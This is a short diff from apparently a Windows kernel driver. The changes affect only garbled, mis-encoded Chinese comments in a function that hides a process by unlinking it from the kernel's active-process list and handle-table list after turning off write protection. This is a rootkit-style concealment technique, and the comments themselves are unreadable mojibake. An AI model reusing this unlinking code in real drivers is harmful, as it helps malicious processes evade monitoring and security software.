@@ -20,9 +20,9 @@ RemoveLinkFromLists(__in HANDLE UniqueProcessId)
         ListEntry = (PLIST_ENTRY)((ULONG)EProcess + offset_Process_ActiveProcessLinks);
         pdoHideGlobalInfo.ActiveProcessList = ListEntry;
         //
-        // À¶µÄ¼¸ÂÊºÜĞ¡£¬µ«Ç°ÌáÊÇ£¬Õâ¸ö²Ù×÷ÒªÔÚIRQL < DISPATCH_LEVEL ÏÂÖ´ĞĞ,
-        // ÒòÎª´ó²¿·ÖÊ±¼äÀï£¬Õâ¸ö²Ù×÷ËùÉæ¼°Éæ¼°µ½µÄÄÚ´æÒÑ¾­±»»»³öÎïÀíÄÚ´æÁË¡£
-        // ÎÒÔÚKiSystemServiceÖ´ĞĞµÄÊ±ºòÖ´ĞĞÕâ¸ö²Ù×÷£¬´ÓÀ´Ã»ÓĞÀ¶¹ı 
+        // è“çš„å‡ ç‡å¾ˆå°ï¼Œä½†å‰ææ˜¯ï¼Œè¿™ä¸ªæ“ä½œè¦åœ¨IRQL < DISPATCH_LEVEL ä¸‹æ‰§è¡Œ,
+        // å› ä¸ºå¤§éƒ¨åˆ†æ—¶é—´é‡Œï¼Œè¿™ä¸ªæ“ä½œæ‰€æ¶‰åŠæ¶‰åŠåˆ°çš„å†…å­˜å·²ç»è¢«æ¢å‡ºç‰©ç†å†…å­˜äº†ã€‚
+        // æˆ‘åœ¨KiSystemServiceæ‰§è¡Œçš„æ—¶å€™æ‰§è¡Œè¿™ä¸ªæ“ä½œï¼Œä»æ¥æ²¡æœ‰è“è¿‡ 
         //
         WPOFF();
         ListEntry->Blink->Flink = ListEntry->Flink;
@@ -32,7 +32,7 @@ RemoveLinkFromLists(__in HANDLE UniqueProcessId)
         
         //
         // ObjectTable -> HandleTableList
-        // ÕâÊÇÒ»¸öÈ«¾Ö¾ä±ú±íÁ´£¬Ä¨µÄ»°²»ºÃ»Ö¸´£¬ÒÔºó½â¾ö
+        // è¿™æ˜¯ä¸€ä¸ªå…¨å±€å¥æŸ„è¡¨é“¾ï¼ŒæŠ¹çš„è¯ä¸å¥½æ¢å¤ï¼Œä»¥åè§£å†³
         //
         ObjectTable = (PVOID)*(PULONG)((ULONG)EProcess + offset_Process_ObjectTable);
         ListEntry = (PLIST_ENTRY)((ULONG)ObjectTable + offset_HandleTable_HandleTableList);
